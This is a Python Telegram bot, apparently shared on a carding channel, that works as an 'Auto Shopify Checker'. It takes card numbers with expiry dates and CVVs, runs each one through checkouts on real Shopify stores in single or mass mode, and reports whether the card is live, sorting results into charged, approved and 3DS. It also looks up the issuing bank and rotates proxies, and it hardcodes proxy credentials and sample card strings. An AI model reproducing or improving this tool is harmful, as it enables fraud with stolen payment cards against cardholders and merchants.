# 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/scriptdung
# 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/scriptdungbackup
# 𝐃𝐞𝐯: @Xoarch (Converted to Telegram Bot)

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import asyncio
import aiohttp
import os
import random
from flask import Flask
from threading import Thread
import time

# api.py မှ လိုအပ်သော လုပ်ဆောင်ချက်များ
from api import process_card, parse_cc_string, extract_clean_response

# ==========================================
# CONFIGURATION & SECURITY
# ==========================================
BOT_TOKEN = os.environ.get("BOT_TOKEN")

if not BOT_TOKEN:
    print("Error: BOT_TOKEN ကို Render Environment တွင် မတွေ့ပါ။")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=True)
app = Flask(__name__)

# အသုံးပြုခွင့်ရှိသူများ
ADMIN_ID = 1847021130
AUTHORIZED_USERS = {ADMIN_ID}

WORKING_KEYWORDS = [
    'card_declined', 'fraud', 'incorrect_zip', 'invalid_cvc', 'invalid_cvv',
    'insufficient_funds', 'otp_required', 'order_placed', 'declined',
    'do_not_honor', 'incorrect_number', 'card_incorrect', 'expired_card',
    'pickup_card', 'restricted_card', 'stolen_card', 'lost_card',
    'card_velocity_exceeded', 'transaction_not_allowed', 'invalid_expiry',
    'processing_error', 'call_issuer', 'try_again_later', 'fraudulent',
    'security_violation', 'blocked', 'bad_cvv', 'cvv_fail',
    'authentication_required', 'mismatched_bill', 'charged', 'approved',
    'wrong_number', 'incorrect number', 'card incorrect'
]

DEAD_KEYWORDS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req', 'cloudflare', 
    'connection failed', 'timed out', 'access denied', 'site dead', 
    'captcha_required', 'captcha required', 'no_session_token',
    'generic_error', 'generic error', 'PAYMENTS_CREDIT_CARD_BASE_EXPIRED',
    'Failed to get session token', 'site not supported'
]

def is_authorized(user_id):
    return user_id in AUTHORIZED_USERS

def get_auto_site(exclude_site=None):
    try:
        with open("sites.txt", "r", encoding="utf-8") as f:
            sites = [line.strip() for line in f if line.strip()]
            if exclude_site and exclude_site in sites and len(sites) > 1:
                sites.remove(exclude_site)
            if sites:
                return random.choice(sites)
    except Exception:
        pass
    return "https://paradoxbrewery.com"

async def get_bin_info(session, cc):
    try:
        bin6 = cc[:6]
        async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5) as res:
            if res.status == 200:
                data = await res.json()
                return (
                    data.get('brand', 'UNKNOWN'),
                    data.get('bank', 'UNKNOWN'),
                    data.get('country_name', 'UNKNOWN'),
                    data.get('level', 'N/A'),
                    data.get('type', 'N/A'),
                    data.get('country_flag', '')
                )
    except:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", ""

def classify_result(success, message):
    msg = message.lower()
    if 'order_placed' in msg: return 'charged'
    if 'otp_required' in msg: return 'tds'
    if any(k in msg for k in ['approved', 'insufficient', 'cvv', 'cvc', 'zip', 'incorrect_zip', 'invalid_cvv', 'invalid_cvc', 'insufficient_funds']): return 'approved'
    if success: return 'declined'
    if any(kw in msg for kw in WORKING_KEYWORDS): return 'declined'
    if any(k in msg for k in DEAD_KEYWORDS): return 'error'
    return 'error'

def fmt_price(price, currency):
    try:
        if not price or price == '0': return "Free"
        return f"${float(price):.2f} {currency}"
    except:
        return f"${price} {currency}"

def fmt_info(brand, type_cc, level):
    if level and level != 'N/A':
        return f"{brand} - {type_cc.upper()} - {level.upper()}"
    return f"{brand} - {type_cc.upper()}"

async def run_with_retry(parts, site, proxy_str=None, max_retries=2):
    last_success, last_msg, last_gate, last_price, last_cur = False, 'ERROR', '', '0', 'USD'
    for attempt in range(max_retries):
        try:
            success, message, gateway, price, currency = await process_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'], site, None, proxy_str
            )
            category = classify_result(success, message)
            if category != 'error' or any(k in message.lower() for k in WORKING_KEYWORDS):
                return success, message, gateway, price, currency, category
            if any(kw in message.lower() for kw in DEAD_KEYWORDS):
                break
            if attempt < max_retries - 1: await asyncio.sleep(1)
        except Exception as e:
            last_msg = f"Error: {str(e)}"
            if attempt < max_retries - 1: await asyncio.sleep(1)
            else: break
    return last_success, last_msg, last_gate, last_price, last_cur, 'error'

def run_async_task(chat_id, site, cc_string, msg_to_edit=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def process_task():
        try:
            parts = parse_cc_string(cc_string)
        except ValueError as e:
            if msg_to_edit: bot.edit_message_text(f"❌ <b>Format Error:</b> {e}", chat_id, msg_to_edit)
            return

        async with aiohttp.ClientSession() as session:
            current_site = site if site.startswith('http') else 'https://' + site
            success, message, gateway, price, currency, category = await run_with_retry(parts, current_site)
            
            if category == 'error':
                if msg_to_edit: bot.edit_message_text(f"⚠️ <b>Site Error! Retrying...</b> <code>{cc_string}</code>", chat_id, msg_to_edit)
                new_site = get_auto_site(exclude_site=current_site)
                new_site = new_site if new_site.startswith('http') else 'https://' + new_site
                success, message, gateway, price, currency, category = await run_with_retry(parts, new_site)

            clean = extract_clean_response(message)
            if category == 'charged': clean = 'ORDER_PLACED'
            elif category == 'tds': clean = 'OTP_REQUIRED'
            
            brand, bank, country, level, type_cc, flag = await get_bin_info(session, parts['cc'])
            price_fmt = fmt_price(price, currency)
            info_str = fmt_info(brand, type_cc, level)

            status_map = {
                'charged': "🟢 <b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥</b>", 'approved': "🔵 <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</b>",
                'tds': "🟡 <b>𝟑𝐃𝐒 ❎</b>", 'declined': "🔴 <b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b>", 'error': "🟠 <b>𝐄𝐫𝐫𝐨𝐫</b>"
            }
            status_disp = status_map.get(category, "🟠 <b>𝐄𝐫𝐫𝐨𝐫</b>")

            final_text = (
                f"💳 𝐂𝐚𝐫𝐝 -» <code>{cc_string}</code>\n"
                f"📊 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status_disp}\n"
                f"💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» <b>{clean}</b>\n"
                f"🛒 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» <b>𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲</b>\n"
                f"💲 𝐏𝐫𝐢𝐜𝐞 -» <b>{price_fmt}</b>\n"
                f"━━━━━━━━━━━━━\n"
                f"ℹ️ 𝙄𝙣𝙛𝙤 -» {info_str}\n"
                f"🏦 𝘽𝙖𝙣𝙠 -» {bank}\n"
                f"🌍 𝘾𝙤𝙪𝗻𝘁𝗿𝐲 -» {country} {flag}\n"
                f"━━━━━━━━━━━━━"
            )

            if msg_to_edit: bot.edit_message_text(final_text, chat_id, msg_to_edit)
            else: bot.send_message(chat_id, final_text)

    loop.run_until_complete(process_task())
    loop.close()

def process_mass(chat_id, cards):
    for cc in cards:
        site = get_auto_site()
        msg = bot.send_message(chat_id, f"⏳ <b>Checking:</b> <code>{cc}</code>")
        Thread(target=run_async_task, args=(chat_id, site, cc, msg.message_id)).start()
        time.sleep(15) 

# ==========================================
# ADMIN PROXY CONTROL PANEL
# ==========================================
@bot.message_handler(commands=['admin', 'panel'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Admin သာလျှင် ဤလုပ်ဆောင်ချက်ကို အသုံးပြုနိုင်ပါသည်။")
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("➕ Proxy အသစ်ထည့်ရန်", callback_data="add_proxy"))
    markup.add(InlineKeyboardButton("🗑 Proxy အားလုံးဖျက်ရန်", callback_data="clear_proxy"))
    markup.add(InlineKeyboardButton("📊 Proxy အရေအတွက်စစ်ရန်", callback_data="count_proxy"))
    
    bot.send_message(message.chat.id, "👨‍💻 <b>Admin Control Panel</b>\nအောက်ပါခလုတ်များကိုနှိပ်၍ Proxy များကို စီမံနိုင်ပါသည်။", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.from_user.id != ADMIN_ID:
        return
        
    if call.data == "add_proxy":
        msg = bot.send_message(call.message.chat.id, "✏️ <b>Proxy အသစ်များကို အောက်ပါအတိုင်း (တစ်ကြောင်းလျှင်တစ်ခု) ပေးပို့ပါ:</b>\n\n<code>ip:port:user:pass\nip:port:user:pass</code>")
        bot.register_next_step_handler(msg, process_add_proxy)
        
    elif call.data == "clear_proxy":
        open("proxies.txt", "w").close()
        bot.answer_callback_query(call.id, "✅ Proxy အားလုံး ဖျက်ပစ်လိုက်ပါပြီ။", show_alert=True)
        
    elif call.data == "count_proxy":
        try:
            with open("proxies.txt", "r") as f:
                proxies = [line for line in f if line.strip()]
            count = len(proxies)
        except:
            count = 0
        bot.answer_callback_query(call.id, f"📊 လက်ရှိ Proxy အရေအတွက်: {count} ခု", show_alert=True)

def process_add_proxy(message):
    if message.from_user.id != ADMIN_ID: return
    lines = message.text.strip().split('\n')
    
    with open("proxies.txt", "a", encoding="utf-8") as f:
        for p in lines:
            if p.strip():
                f.write(p.strip() + "\n")
                
    bot.reply_to(message, f"✅ Proxy အသစ် {len(lines)} ခု အောင်မြင်စွာ ထည့်သွင်းပြီးပါပြီ။")

# ==========================================
# BOT COMMANDS
# ==========================================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "🚫 <b>ခွင့်ပြုချက်မရှိပါ။</b>")
        return
    bot.reply_to(message, "မင်္ဂလာပါ၊ Command များကို ကြည့်ရှုရန် /cmd ကိုနှိပ်ပါ။")

@bot.message_handler(commands=['cmd'])
def send_cmd(message):
    if not is_authorized(message.from_user.id):
        return
        
    text = (
        "<b>🔥 Auto Shopify Checker Bot 🔥</b>\n\n"
        "<b>(၁) Single Check:</b>\n<code>/chk 5275150060415544|05|27|803</code>\n\n"
        "<b>(၂) Mass Check:</b>\n<code>/chk mass\n5275150060415544|05|27|803\n4031630597626141|02|29|970</code>\n"
    )
    if message.from_user.id == ADMIN_ID:
        text += "\n<b>Admin Commands:</b>\n<code>/panel</code> (Proxy စီမံရန်)\n<code>/add UserID</code>\n<code>/rm UserID</code>"
    bot.reply_to(message, text)

@bot.message_handler(commands=['add'])
def add_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        new_user = int(message.text.split()[1])
        AUTHORIZED_USERS.add(new_user)
        bot.reply_to(message, f"✅ User ID <code>{new_user}</code> အား အသုံးပြုခွင့် ပေးလိုက်ပါပြီ။")
    except:
        bot.reply_to(message, "❌ အသုံးပြုနည်း: <code>/add UserID</code>")

@bot.message_handler(commands=['rm'])
def remove_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        rm_user = int(message.text.split()[1])
        if rm_user == ADMIN_ID:
            bot.reply_to(message, "❌ Admin ကို ဖျက်၍မရပါ။")
            return
        AUTHORIZED_USERS.discard(rm_user)
        bot.reply_to(message, f"🚫 User ID <code>{rm_user}</code> အား အသုံးပြုခွင့် ပိတ်လိုက်ပါပြီ။")
    except:
        bot.reply_to(message, "❌ အသုံးပြုနည်း: <code>/rm UserID</code>")

@bot.message_handler(commands=['chk'])
def check_command(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "🚫 <b>ခွင့်ပြုချက်မရှိပါ။</b>")
        return

    lines = message.text.strip().split('\n')
    first_line_args = lines[0].split()

    if len(first_line_args) > 1 and first_line_args[1].lower() == 'mass':
        cards = [line.strip() for line in lines[1:] if line.strip()]
        if not cards:
            bot.reply_to(message, "❌ ကတ်နံပါတ်များ မတွေ့ပါ။")
            return
        if len(cards) > 10:
            bot.reply_to(message, "⚠️ တစ်ကြိမ်လျှင် ကတ် (၁၀) ကတ်သာ အများဆုံး စစ်ဆေးနိုင်ပါသည်။")
            cards = cards[:10]
        bot.reply_to(message, f"⏳ <b>Mass Checking {len(cards)} Cards...</b>")
        Thread(target=process_mass, args=(message.chat.id, cards)).start()
    else:
        if len(first_line_args) == 2:
            site = get_auto_site()
            cc_string = first_line_args[1]
            msg = bot.reply_to(message, f"⏳ <b>Checking Card...</b>")
            Thread(target=run_async_task, args=(message.chat.id, site, cc_string, msg.message_id)).start()
        else:
            bot.reply_to(message, "❌ <b>အသုံးပြုနည်း မှားယွင်းနေပါသည်။</b>")

# ==========================================
# WEB SERVER
# ==========================================
@app.route('/')
def index():
    return "Bot is running perfectly and secured!"

def run_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    Thread(target=run_server, daemon=True).start()
    # Ensure proxies file exists
    if not os.path.exists("proxies.txt"):
        open("proxies.txt", "w").close()
    
    # Pre-load initial proxies if they don't exist
    try:
        with open("proxies.txt", "r") as f:
            if not f.read().strip():
                initial_proxies = [
                    "31.59.20.176:6754:klzmaipj:1ans3lrhk2lv",
                    "45.38.107.97:6014:klzmaipj:1ans3lrhk2lv",
                    "198.105.121.200:6462:klzmaipj:1ans3lrhk2lv",
                    "64.137.96.74:6641:klzmaipj:1ans3lrhk2lv",
                    "198.23.243.226:6361:klzmaipj:1ans3lrhk2lv",
                    "38.154.185.97:6370:klzmaipj:1ans3lrhk2lv",
                    "84.247.60.125:6095:klzmaipj:1ans3lrhk2lv",
                    "142.111.67.146:5611:klzmaipj:1ans3lrhk2lv",
                    "191.96.254.138:6185:klzmaipj:1ans3lrhk2lv",
                    "31.58.9.4:6077:klzmaipj:1ans3lrhk2lv"
                ]
                with open("proxies.txt", "w") as fp:
                    for p in initial_proxies:
                        fp.write(p + "\n")
    except:
        pass

    print("Secured Bot Started...")
    bot.infinity_polling(timeout=20, long_polling_timeout=20)
